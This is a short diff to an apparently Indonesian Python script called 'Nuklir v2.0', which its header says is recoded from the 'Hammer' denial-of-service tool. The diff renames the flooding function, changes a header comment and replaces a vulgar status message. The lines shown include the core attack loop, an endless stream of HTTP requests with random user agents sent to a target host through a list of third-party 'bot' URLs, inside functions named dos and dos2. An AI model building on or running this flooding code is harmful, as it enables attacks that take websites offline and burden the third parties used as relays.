@@ -9,7 +9,7 @@
 #////                     |_| \_|\__,_|_|\_\_|_|_|                         ////
 #///////////////////////////////////////////////////////////////////////////////
 #///////////////////////////////////////////////////////////////////////////////
-# Script ini recode dari Hammer
+# Script ini masih versi beta
 # python 3.3.2+ Nuklir v2.0
 # by Mr.RLA 0712
 
@@ -39,7 +39,7 @@ def my_bots():
 	return(bots)
 
 
-def bot_hammering(url):
+def bot_nuklir(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
@@ -78,7 +78,7 @@ def dos():
 def dos2():
 	while True:
 		item=w.get()
-		bot_hammering(random.choice(bots)+"http://"+host)
+		bot_nuklir(random.choice(bots)+"http://"+host)
 		w.task_done()
 
 
@@ -150,7 +150,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mKakek Sugiono melakukan Pengecekan Kontol...\033[0m")
+	print("\033[94mSedang Melakukan Pengecekan...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
